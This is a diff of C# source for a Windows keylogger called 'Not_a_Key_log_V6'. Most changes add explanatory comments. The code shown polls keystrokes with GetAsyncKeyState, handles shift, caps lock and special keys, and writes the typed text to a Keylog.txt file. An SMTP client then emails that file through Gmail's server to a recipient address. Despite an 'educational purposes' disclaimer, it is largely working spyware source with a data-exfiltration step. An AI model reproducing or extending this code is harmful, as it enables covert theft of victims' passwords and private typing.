@@ -1,5 +1,5 @@
-﻿//This was made for educational purposes I am NOT legally responsible for any ill-use anyone else commits with this program. 
-//Due to OEM keys this will only work on UK keybaoards
+﻿//This was made for educational purposes I am NOT responsible for any ill-use anyone else commits with this program. 
+//Due to OEM keys this will only work on UK keyboards
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -21,8 +21,8 @@ namespace Not_a_Key_log_V6
     {
 
         //global variables 
-        static bool BigChar = false;
-        static bool shift = false;
+        static bool BigChar = false; //logs if capital letters are to be logged
+        static bool shift = false; //logs if shift has been pressed 
         static int littleNum;
         static int count = 0;
         static string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); //this is just the directory where the file is going to go 
@@ -71,15 +71,16 @@ namespace Not_a_Key_log_V6
 
 
 
-
-                    if (KeyState == 32769) //registers if a key has been pressed. If a key has been pressed 32769 would be logged
+                                           
+                    if (KeyState == 32769) //registers if a key has been pressed. If a key has been pressed 32769 will be logged 
                     {
-                        count++;
-                        Console.WriteLine(count); //logs how many keys have been pressed
+                        count++; //logs how many keys have been pressed
+                        Console.WriteLine(count); 
 
-                        littleNum = 0; //this'll be important later
+                        littleNum = 0; //this will handle OEM keys and special characters when shift is pressed
 
                         string buf = ((char)i).ToString(); //this makes sure we get the actual keys NOT the numbers of the keys 
+                        //buf stores the actual key that has been pressed e.g it will log 'a' instead of 65
                         //Note: number pad keys haven't been added 
                         //the if statements below handle when special characters or OEM characters pressed 
                         if (((Keys)i) == (Keys.Oem7))
@@ -170,7 +171,7 @@ namespace Not_a_Key_log_V6
                             buf = "<Escape>"; 
                         }
                         short shiftState = (short)GetAsyncKeyState(16); //handles when shift is pressed 
-                        if ((shiftState & 0x8000) == 0x8000)
+                        if ((shiftState & 0x8000) == 0x8000) //0x800 is hex for shift key 
                         {
                             shift = true;
                             if (((Keys)i) == (Keys.RShiftKey)) 
@@ -190,11 +191,11 @@ namespace Not_a_Key_log_V6
                         if (((Keys)i) == (Keys.CapsLock)) //handles caps lock 
                         {
                             buf = "<Caps>";
-                            if (BigChar == true)    
-                            {
-                                BigChar = false;
+                            if (BigChar == true)    //caps lock only needs to be pressed, handling it is different. 
+                            {                       //when caps lock is pressed and capitals are already enabled, we disable capitals, returing to lower case
+                                BigChar = false;   
                             }
-                            else if (BigChar == false)
+                            else if (BigChar == false) //if caps lock is pressed and capitals are not enables, we enable them. 
                             {
                                 BigChar = true;
                             }
@@ -424,19 +425,19 @@ namespace Not_a_Key_log_V6
             SmtpClient Client = new SmtpClient() //Smtp = Simple mail transfer protocol, the rules the allow for emails to be sent. 
             {
                 Host = "smtp.gmail.com", //the service we'll use to send the email, this only works with Gmail emails 
-                Port = 587, //Gmail port, only works with Gmail accounts
+                Port = 587, //Gmail port, only works is sender is a Gmail account, the recipient can be any email. 
                 EnableSsl = true,
                 DeliveryMethod = SmtpDeliveryMethod.Network, 
                 UseDefaultCredentials = false, //removes all previous credentials
                 Credentials = new NetworkCredential() //sets up new credentials so the program can sign in and send the email
                 {
-                    UserName = "[Sender Email]",
+                    UserName = "[Sender Email]",     //allows program to login. 
                     Password = "[Sender Email Password]"
                 }
 
             };
-            MailAddress FromEmail = new MailAddress("[Sender Email]");  //I bet you thought one of these would be my actual email right?
-            MailAddress ToEmail = new MailAddress("[Recipient Email]");   //Of course it wouldn't be, am I stupid? 
+            MailAddress FromEmail = new MailAddress("[Sender Email]");  
+            MailAddress ToEmail = new MailAddress("[Recipient Email]");   
             System.Net.Mail.Attachment attachment;
             attachment = new System.Net.Mail.Attachment(path); //will find file on this path, the Keylog.txt file
             MailMessage Message = new MailMessage()
